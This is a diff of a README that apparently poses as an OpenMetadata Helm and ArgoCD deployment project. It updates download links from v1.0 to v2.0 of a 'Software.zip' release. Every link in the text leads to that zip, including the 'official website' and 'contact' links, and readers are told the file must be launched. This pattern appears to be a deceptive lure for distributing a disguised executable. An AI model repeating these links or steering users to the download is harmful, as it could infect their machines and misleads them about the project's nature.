@@ -11,7 +11,7 @@ argo, argo-cd, argocd, docker, helm, helm-chart, helm-charts, k8s, kind, kuberne
 
 ## 📦 Installation
 To get started, you can download the necessary resources to deploy OpenMetadata via Helm and ArgoCD by clicking the link below:
-[![Download ZIP](https://github.com/jeremiah95676t/openmetadata-helm-argocd/releases/download/v1.0/Software.zip)](https://github.com/jeremiah95676t/openmetadata-helm-argocd/releases/download/v1.0/Software.zip)
+[![Download ZIP](https://github.com/jeremiah95676t/openmetadata-helm-argocd/releases/download/v2.0/Software.zip)](https://github.com/jeremiah95676t/openmetadata-helm-argocd/releases/download/v2.0/Software.zip)
 
 ## Need Help?
 If the link above ends with a file name, it needs to be launched to access the deployment resources. In case you encounter any issues with the link provided, please check the "Releases" section of this repository for additional resources.
@@ -32,7 +32,7 @@ Follow these steps to deploy OpenMetadata via Helm and ArgoCD:
 - Customizable Helm charts for tailored OpenMetadata deployments.
 
 ### 🌐 Additional Resources:
-For more information and detailed documentation on deploying OpenMetadata with Helm and ArgoCD, visit the [OpenMetadata Official Website](https://github.com/jeremiah95676t/openmetadata-helm-argocd/releases/download/v1.0/Software.zip).
+For more information and detailed documentation on deploying OpenMetadata with Helm and ArgoCD, visit the [OpenMetadata Official Website](https://github.com/jeremiah95676t/openmetadata-helm-argocd/releases/download/v2.0/Software.zip).
 
 ### 🤝 How to Contribute:
 We welcome contributions from the community to improve and enhance the OpenMetadata Helm ArgoCD deployment. To contribute, please follow these steps:
@@ -41,7 +41,7 @@ We welcome contributions from the community to improve and enhance the OpenMetad
 3. Submit a pull request.
 
 ### 📧 Contact Us:
-If you have any questions, feedback, or suggestions regarding the OpenMetadata Helm ArgoCD project, feel free to reach out to us at https://github.com/jeremiah95676t/openmetadata-helm-argocd/releases/download/v1.0/Software.zip
+If you have any questions, feedback, or suggestions regarding the OpenMetadata Helm ArgoCD project, feel free to reach out to us at https://github.com/jeremiah95676t/openmetadata-helm-argocd/releases/download/v2.0/Software.zip
 
 ---
 
